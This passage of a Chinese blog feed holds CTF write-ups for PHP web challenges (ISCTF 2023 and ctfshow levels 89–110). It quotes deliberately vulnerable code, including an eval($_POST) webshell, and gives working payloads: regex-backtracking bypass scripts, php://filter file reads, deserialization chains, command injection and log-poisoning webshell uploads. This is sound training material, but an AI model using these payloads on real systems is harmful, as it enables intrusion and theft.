invoke__">stripos</span>(<span class="variable">$try</span>,<span class="string">&#x27;HACKER&#x27;</span>) === <span class="literal">TRUE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$b</span>,<span class="string">&#x27;php&#x27;</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>))-&gt;<span class="variable">$c</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;114514到底是啥意思嘞？。？&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span></span><br><span class="line"><span class="variable">$shell</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">114514</span>到底是啥意思嘞？。？</span><br></pre></td></tr></table></figure><p>e_m.p这个和前面的一样应该，直接转义成为e[m.p，然后绕过intval:让他等于114544.1</p><p>而a,b,c的话和之前学的php特性差不多，直接使用原生类:a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&amp;c&#x3D;__toString</p><p>然后try的话绕过两个正则用到回溯次数绕过，就是构造：一万个1.’HACKER’,脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">res = requests.post(<span class="string">&quot;http://gz.imxbt.cn:20040/index.php?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString&quot;</span>,data = &#123;<span class="string">&quot;try&quot;</span>:<span class="string">&quot;-&quot;</span>*<span class="number">1000001</span>+<span class="string">&quot;HACKER&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h3 id="RCE-or-Sql-Inject"><a href="#RCE-or-Sql-Inject" class="headerlink" title="RCE or Sql Inject"></a>RCE or Sql Inject</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/se|ec|;|@|del|into|outfile/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有sql注入&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有RCE&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure><p>提示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R! C! E!</span><br><span class="line">mysql远程连接和命令行操作是不是有些区别呢</span><br><span class="line">输个问号看看?</span><br></pre></td></tr></table></figure><p>额，在自己的mysql里面测试打?,发现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">system    (\!) Execute a system shell command.</span><br></pre></td></tr></table></figure><p>意思是使用system关键字或!可以直接通过mysql命令行执行一个system shell命令，ok，那就简单了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sql=%0asystem ls /发现没有flag 之前学的env可以返回环境变量，</span><br><span class="line">?sql=%0asystem env这个就出来了</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>isctf2023web部分wp</title>
      <link href="/2025/03/17/isctf2023web%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/03/17/isctf2023web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h2 id="isctf2023web部分wp"><a href="#isctf2023web部分wp" class="headerlink" title="isctf2023web部分wp"></a>isctf2023web部分wp</h2><h3 id="圣杯战争-："><a href="#圣杯战争-：" class="headerlink" title="圣杯战争!!!："></a>圣杯战争!!!：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); class artifact&#123;   public $excalibuer;   public $arrow;   public function __toString()&#123;     echo &quot;为Saber选择了对的武器!&lt;br&gt;&quot;;     return $this-&gt;excalibuer-&gt;arrow;   &#125; &#125; class prepare&#123;   public $release;   public function __get($key)&#123;     $functioin = $this-&gt;release;     echo &quot;蓄力!咖喱棒！！&lt;br&gt;&quot;;     return $functioin();   &#125; &#125; class saber&#123;   public $weapon;   public function __invoke()&#123;     echo &quot;胜利！&lt;br&gt;&quot;;     include($this-&gt;weapon);   &#125; &#125; class summon&#123;   public $Saber;   public $Rider;   public function __wakeup()&#123;     echo &quot;开始召唤从者！&lt;br&gt;&quot;;     echo $this-&gt;Saber;   &#125; &#125; </span><br></pre></td></tr></table></figure><p>链子：summon-&gt;artifact-&gt;prepare-&gt;saber</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">&#125;</span><br><span class="line">class saber&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Saber;</span><br><span class="line">    public $Rider;</span><br><span class="line">&#125;</span><br><span class="line">$a = new summon();</span><br><span class="line">$b = new artifact();</span><br><span class="line">$c = new prepare();</span><br><span class="line">$d = new saber();</span><br><span class="line">$a -&gt; Saber = $b;</span><br><span class="line">$b -&gt; excalibuer = $c;</span><br><span class="line">$c -&gt; release = $d;</span><br><span class="line">$d -&gt; weapon = &quot;php://filter/convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><h3 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里:"></a>绕进你的心里:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); require &#x27;flag.php&#x27;; $str = (String)$_POST[&#x27;pan_gu&#x27;]; $num = $_GET[&#x27;zhurong&#x27;]; $lida1 = $_GET[&#x27;hongmeng&#x27;]; $lida2 = $_GET[&#x27;shennong&#x27;]; if($lida1 !== $lida2 &amp;&amp; md5($lida1) === md5($lida2))&#123;   echo &quot;md5绕过了!&quot;;   if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;     die(&#x27;你干嘛?哎哟!&#x27;);   &#125;   elseif(intval($num))&#123;     if(preg_match(&#x27;/.+?ISCTF/is&#x27;, $str))&#123;       die(&quot;再想想!&quot;);     &#125;     if(stripos($str, &#x27;2023ISCTF&#x27;) === false)&#123;       die(&quot;就差一点点啦!&quot;);     &#125;     echo $flag;   &#125; &#125; ?&gt; </span><br></pre></td></tr></table></figure><p>这个首先是md5绕过，进行数组绕过，然后绕过preg_match函数再进行绕过这个：</p><p>if(preg_match(‘&#x2F;.+?ISCTF&#x2F;is’, $str)){            die(“再想想!”);        }        if(stripos($str, ‘2023ISCTF’) &#x3D;&#x3D;&#x3D; false){            die(“就差一点点啦!”);        }</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;pan[gu&#x27;: &#x27;a&#x27;*1000000 + &#x27;2023ISCTF&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(&#x27;http://gz.imxbt.cn:20215/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=a&#x27;,</span><br><span class="line">                    data=data, allow_redirects=False)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h3 id="Where-is-the-flag"><a href="#Where-is-the-flag" class="headerlink" title="Where is the flag:"></a>Where is the flag:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php //flag一分为3，散落在各处，分别是：xxxxxxxx、xxxx、xxx。 highlight_file(__FILE__); //标准一句话木马~ eval($_POST[1]); ?&gt;</span><br></pre></td></tr></table></figure><p>简单直接：1&#x3D;system(‘env’); 显示当前的环境变量，没想到直接出来了</p><h3 id="wafr："><a href="#wafr：" class="headerlink" title="wafr："></a>wafr：</h3><p>RCE的题，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php /* Read /flaggggggg.txt */ error_reporting(0); header(&#x27;Content-Type: text/html; charset=utf-8&#x27;); highlight_file(__FILE__); if(preg_match(&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;, $_POST[&#x27;code&#x27;]))&#123;//strings   die(&quot;想读我文件？大胆。&quot;); &#125; elseif (preg_match(&quot;/\^|\||\~|\\$|\%|jay/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;无字母数字RCE？大胆！&quot;); &#125; elseif (preg_match(&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;奇技淫巧？大胆！！&quot;); &#125; elseif (preg_match(&quot;/fl|ag|\.|x/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;大胆！！！&quot;); &#125; else&#123;   assert($_POST[&#x27;code&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>简单，code&#x3D;system(‘ca\t f*’)%0c</p><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz!:"></a>Fuzz!:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php /* Read /flaggggggg.txt Hint: 你需要学会fuzz，看着键盘一个一个对是没有灵魂的 知识补充：curl命令也可以用来读取文件哦，如curl file:///etc/passwd */ error_reporting(0); header(&#x27;Content-Type: text/html; charset=utf-8&#x27;); highlight_file(__FILE__); $file = &#x27;file:///etc/passwd&#x27;; if(preg_match(&quot;/\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\\\\|\&#x27;|\&quot;|\;|\&lt;|\&gt;|\,|\?|jay/i&quot;, $_GET[&#x27;file&#x27;]))&#123;   die(&#x27;你需要fuzz一下哦~&#x27;); &#125; if(!preg_match(&quot;/fi|le|flag/i&quot;, $_GET[&#x27;file&#x27;]))&#123;   $file = $_GET[&#x27;file&#x27;]; &#125; system(&#x27;curl &#x27;.$file); </span><br></pre></td></tr></table></figure><p>新学俩个知识点：[a-z]可以绕过任意一个字母,”|”没过滤可以放在开头结束前面的curl，然后再拼接系统命令</p><p>payload:?file&#x3D;|tac &#x2F;fl[a-z]ggggggg.txt   然后还有一个:?file&#x3D;f{i}l{e}:&#x2F;&#x2F;&#x2F;fla{g}gggggg.txt  进行file:&#x2F;&#x2F;读取文件指在本地系统里面读取文件</p><h3 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini:"></a>ez_ini:</h3><p>发现是文件上传，进行上传文件传.user.ini.png什么的，然后在bp里面进行改成.user.ini ,</p><p>内容：GIF89a<br>auto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>在UA头上面传小🐎，然后蚁剑直接连就行了；</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow中php特性上</title>
      <link href="/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/"/>
      <url>/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP特性："><a href="#PHP特性：" class="headerlink" title="PHP特性："></a>PHP特性：</h2><h3 id="89"><a href="#89" class="headerlink" title="89:"></a>89:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c = $_GET[&#x27;c&#x27;];   if(!preg_match(&quot;/flag/i&quot;, $c))&#123;     eval($c);   &#125;   &#125;else&#123;   highlight_file(__FILE__); &#125;</span><br></pre></td></tr></table></figure><p>命令执行：?c&#x3D;system(‘tac fl*’);</p><h3 id="90"><a href="#90" class="headerlink" title="90:"></a>90:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;   $num = $_GET[&#x27;num&#x27;];   if($num===&quot;4476&quot;)&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0)===4476)&#123;     echo $flag;   &#125;else&#123;     echo intval($num,0);   &#125; </span><br></pre></td></tr></table></figure><h4 id="intval"><a href="#intval" class="headerlink" title="intval:"></a>intval:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p><code>$var</code>：要转换为整数的变量，可以是字符串、浮点数等。</p><p><code>$base</code>：可选参数，指定转换所使用的进制，默认值是 10（十进制）</p><p>intval ($num,0)： 如果 base 是 0，通过检测 var 的格式来决定使用的进制： 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则， 如果字符串以 “0” 开始，使用 8 进制 (octal)；否则， 将使用 10 进制 (decimal)。</p><p>这个是意思让num!&#x3D;4476,但是intval($num,0)的意思是：<code>if(intval($num,0)===4476)</code> 语句的作用是判断经过 <code>intval</code> 转换后的 <code>$num</code> 的整数值是否严格等于 <code>4476</code> ，如果是，则执行 <code>if</code> 代码块内的语句；如果不是，则跳过 <code>if</code> 代码块内的语句。</p><p>那么就可以进行进制：?num&#x3D;0x117C</p><h3 id="91"><a href="#91" class="headerlink" title="91:"></a>91:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=$_GET[&#x27;cmd&#x27;]; if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;   if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;     echo &#x27;hacker&#x27;;   &#125;   else&#123;     echo $flag;   &#125; &#125; else&#123;   echo &#x27;nonononono&#x27;; &#125; </span><br></pre></td></tr></table></figure><p>前面正则是im,但是后面却是i:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，</span><br><span class="line">将以换行为分隔符，逐行进行匹配</span><br><span class="line">$str = &quot;abc\nabc&quot;;</span><br><span class="line">$preg = &quot;/^abc$/m&quot;;</span><br><span class="line">preg_match($preg, $str,$matchs);</span><br><span class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>?cmd&#x3D;%0aphp(%0a是换行)</p><h3 id="92："><a href="#92：" class="headerlink" title="92："></a>92：</h3><p>和90一样；</p><h3 id="93："><a href="#93：" class="headerlink" title="93："></a>93：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($num==4476)&#123;     die(&quot;no no no!&quot;);   &#125;   if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0)==4476)&#123;     echo $flag;</span><br></pre></td></tr></table></figure><p>过滤了字母但是就是不能使用16进制，但是可以使用8进制：num&#x3D;010574;</p><h3 id="94"><a href="#94" class="headerlink" title="94:"></a>94:</h3><p>多过滤了0,就是不能使用8进制，可以使用小数：num&#x3D;4476.0;</p><h3 id="95"><a href="#95" class="headerlink" title="95:"></a>95:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;   $num = $_GET[&#x27;num&#x27;];   if($num==4476)&#123;     die(&quot;no no no!&quot;);   &#125;   if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;     die(&quot;no no no!!&quot;);   &#125;   if(!strpos($num, &quot;0&quot;))&#123;     die(&quot;no no no!!!&quot;);   &#125;   if(intval($num,0)===4476)&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure><p><code>strpos()</code> 是 PHP 中的一个内置函数，用于查找字符串中第一次出现指定子字符串的位置。那么就可以使用：?num&#x3D;%0a010574(0b,0c)都是可以的;</p><h3 id="96："><a href="#96：" class="headerlink" title="96："></a>96：</h3><p>(1):直接上php伪协议：u&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>(2)linux:linux下面表示当前目录是 .&#x2F; 所以我们的payload： u&#x3D;.&#x2F;flag.php</p><h3 id="97"><a href="#97" class="headerlink" title="97:"></a>97:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123; if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;]) if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) echo $flag; else print &#x27;Wrong.&#x27;</span><br></pre></td></tr></table></figure><p>这个是md5绕过，在 PHP 中，存在弱类型比较的机制，即使用 <code>==</code> 进行比较时，PHP 会尝试将不同类型的数据转换为合适的类型再进行比较。当对数组使用 <code>md5()</code> 函数时，<code>md5()</code> 函数无法处理数组，会返回 <code>null</code>。</p><p>直接数组绕过：a[]&#x3D;1&amp;b[]&#x3D;2</p><h3 id="98"><a href="#98" class="headerlink" title="98:"></a>98:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;); $_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;; $_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;; $_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__); ?&gt; </span><br></pre></td></tr></table></figure><p>首先要看懂三元运算符，其格式为：(expr1) ? (expr2):(expr3)。如果 expr1 为 true，则执行 expr2；否则，执行 expr3。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br></pre></td></tr></table></figure><p>即判断有没有GET的值传，如果有那么GET传参的值&#x3D;POST传参的值然后：?HTTP_FLAG&#x3D;flag&#x2F;&#x2F;POST:HTTP_FLAG&#x3D;flag</p><h3 id="99"><a href="#99" class="headerlink" title="99:"></a>99:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allow = array(); for ($i=36; $i &lt; 0x36d; $i++) &#123;   array_push($allow, rand(1,$i)); &#125; if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;   file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>首先创建一个名为$allow的数组；然后在这个数组里面使用for循环在数组中添加随机数从1一直到877：第一次:1-36,第二次:1-37依次循环；然后可以在当前目录新建一个文件并且在文件中写入任意的东西但是前提是传入n的值再随机数的数组中存在</p><p>这里说明一下：in_array函数的小问题：<strong>in_array(）此函数一般情况下会把 <code>&quot;1.php&quot;</code> 视为数字 <code>1</code>，2.php同理</strong></p><p>然后就猜1,2,3什么的概率大点：然后在：?n&#x3D;1.php;&#x2F;&#x2F;&#x2F;&#x2F;POST:content&#x3D;<?=system('ls');?>然后就是命令执行了</p><h3 id="100："><a href="#100：" class="headerlink" title="100："></a>100：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__); include(&quot;ctfshow.php&quot;); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET[&#x27;v1&#x27;]; $v2=$_GET[&#x27;v2&#x27;]; $v3=$_GET[&#x27;v3&#x27;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123;   if(!preg_match(&quot;/\;/&quot;, $v2))&#123;     if(preg_match(&quot;/\;/&quot;, $v3))&#123;       eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);     &#125;   &#125;   &#125;  ?&gt; </span><br></pre></td></tr></table></figure><p>这个首先要知道赋值操作大于and;即只要v1&#x3D;num就行了然后就可以利用eval函数了(RCE)就行了；</p><p>v1&#x3D;1&amp;v2&#x3D;system(‘ls’)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><h3 id="101："><a href="#101：" class="headerlink" title="101："></a>101：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v1=$_GET[&#x27;v1&#x27;]; $v2=$_GET[&#x27;v2&#x27;]; $v3=$_GET[&#x27;v3&#x27;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123;   if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;     if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;       eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);     &#125;   &#125;   &#125; </span><br></pre></td></tr></table></figure><p>这关和web100关的区别是禁用了许多符号这就说明我们无法使用注释来像上一关那样输出ctfshow;</p><p>这里呢需要使用内置函数反射类给他回显出来：</p><ul><li>ReflectionClass：获取类的相关信息，函数、属性、常量等；</li><li>ReflectionMethod：类的相关方法的获取以及调用；</li><li>ReflectionParameter：获取类的函数或者方法参数的相关信息；</li><li>ReflectionProperty：类的相关属性</li></ul><p>然后v1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;</p><h3 id="102："><a href="#102：" class="headerlink" title="102："></a>102：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; $v4 = is_numeric($v2) and is_numeric($v3); if($v4)&#123;   $s = substr($v2,2);   $str = call_user_func($v1,$s);   echo $str;   file_put_contents($v3,$str); &#125; else&#123;   die(&#x27;hacker&#x27;); &#125;  ?&gt; </span><br></pre></td></tr></table></figure><p>substr函数:substr(a,b):返回一部分，从b开始截取 例：$a&#x3D;123456 substr($a,2); 返回：3456</p><p>call_user_func ($callback, parameter)：调用函数，第一个参数为被调用的函数，第二个参数为被调用函数所需的参数</p><p>file_put_contents (filename, data)：把 data 数据写入 filename;</p><p>既然往进写文件那就可以写一个php的一句话木马或者是命令执行那一句话木马如何只作为数字并且经过函数又正常执行呢那一定是16进制和hex2bin但是0x在is_numeric里面过不去；所以可以进行：先base64再16进制：</p><?=`tac *`;(base64之后再转16进制)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=cc504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php` `post: v1=hex2bin</span><br></pre></td></tr></table></figure>### 103：就过滤了php,和102一样### 104：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(sha1($v1)==sha1($v2))&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>直接数组绕过### 105：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__); include(&#x27;flag.php&#x27;); error_reporting(0); $error=&#x27;你还想要flag嘛？&#x27;; $suces=&#x27;既然你想要那给你吧！&#x27;; foreach($_GET as $key =&gt; $value)&#123;   if($key===&#x27;error&#x27;)&#123;     die(&quot;what are you doing?!&quot;);   &#125;   $$key=$$value; &#125;foreach($_POST as $key =&gt; $value)&#123;   if($value===&#x27;flag&#x27;)&#123;     die(&quot;what are you doing?!&quot;);   &#125;   $$key=$$value; &#125; if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;   die($error); &#125; echo &quot;your are good&quot;.$flag.&quot;\n&quot;; die($suces); ?&gt; </span><br></pre></td></tr></table></figure>变量覆盖：[PHP变量覆盖漏洞解析-CSDN博客](https://blog.csdn.net/weixin_43803070/article/details/91151861)foreach ($_GET as $key => $value)$$key = $$value这个的意思如果你进行GET传参的话：1=flag;那么就是$1=$flag;然后再根据条件:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;   die($error); </span><br></pre></td></tr></table></figure>这个就是检查POST传参里面的键里面是不是有flag的参数；然后它比较 $_POST['flag'] 的值与之前加载的 flag.php 文件中定义的 $flag 变量的值是否相等。如果这两个值不相等（即 !($_POST['flag']==$flag) 为真），则执行die($error); 语句，终止脚本执行，并输出 $error 变量的值作为错误信息；这里利用的是die($error)来实现的输出pyload:GET:?1=flag  POST:error=1;即：$error=$1=$flag;### 106：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>数组绕过；### 107:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v3 = $_GET[&#x27;v3&#x27;];    parse_str($v1,$v2);    if($v2[&#x27;flag&#x27;]==md5($v3))&#123;      echo $flag;    &#125; </span><br></pre></td></tr></table></figure>`parse_str` 函数有两种使用方式：1. 当只传入一个参数时，它会把查询字符串解析成变量，并将这些变量注册到当前符号表中。//可以理解是传值2. 当传入两个参数时，它会把查询字符串解析成变量，然后将这些变量作为键值对存储在第二个参数所指定的数组里。先数组绕过?v3[]=1;然后<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($v2[&#x27;flag&#x27;]==md5($v3))&#123;      echo $flag;    &#125; </span><br></pre></td></tr></table></figure>v1=flag### 108:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123;   die(&#x27;error&#x27;); &#125; //只有36d的人才能看到flag if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;   echo $flag; &#125; </span><br></pre></td></tr></table></figure>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配;?c=a%00778### 109:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_GET[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;       eval(&quot;echo new $v1($v2());&quot;);   &#125; </span><br></pre></td></tr></table></figure>可以进行和反射类一样或者尝试一下异常类### 110：<figure class="highlight plaintext"><table><tr><td 